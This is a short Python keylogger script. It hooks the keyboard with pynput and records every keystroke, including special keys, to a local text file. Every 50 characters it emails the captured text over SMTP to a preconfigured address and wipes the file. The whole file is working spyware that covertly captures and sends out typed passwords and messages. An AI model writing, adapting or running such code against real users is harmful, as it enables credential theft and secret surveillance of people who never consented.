from pynput import keyboard
import io
import os
import const
import smtplib

def send_email(body):
    server = smtplib.SMTP(const.HOST, const.PORT)
    server.login(const.API_KEY, const.SECRET_KEY)
    #YOUR AUTH METHODS
    server.sendmail(const.FROM, const.TO, body)
    server.close()

###    FILE
data=''

def reset_data():
    global data
    data=''

def write_data(char):
    global data
    data+=char
    if len(data) >= 10:
        write_file('file', 'txt', data)
        reset_data()

def write_file(filename, ext, data):
    if not os.path.isfile(os.getcwd()+'\\{file}.{ext}'.format(file=filename, ext=ext)):
        try:
            f=io.open('{file}.{ext}'.format(file=filename, ext=ext), mode='x')
            f.close()
        except OSError:
            pass
    file=io.open('{file}.{ext}'.format(file=filename, ext=ext), mode='a+')
    file.write(data)
    file.close()
    with io.open('{file}.{ext}'.format(file=filename, ext=ext), mode='r') as file2:
        body=file2.read()
        if len(body)>=50:
            send_email(body)
            erase_file(filename, ext)

def erase_file(filename, ext):
    if os.path.isfile(os.getcwd()+'\\{file}.{ext}'.format(file=filename, ext=ext)):
        f=io.open('{file}.{ext}'.format(file=filename, ext=ext), mode='w')
        f.write('')

###    LISTENER
def on_press(key):
    try:
        if 'char' in dir(key):
            if key.char:
                write_data(key.char)
            elif hasattr(key, 'vk'):
                if 96<=key.vk<=105:
                    write_data(str(key.vk-96))
        elif 'name' in dir(key):
            if key.name == 'space':
                write_data(' ')
            else:
                write_data('({key})'.format(key=key.name.upper()))
        else:
            write_data(key)
    except:
        pass
        

def on_release(key):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
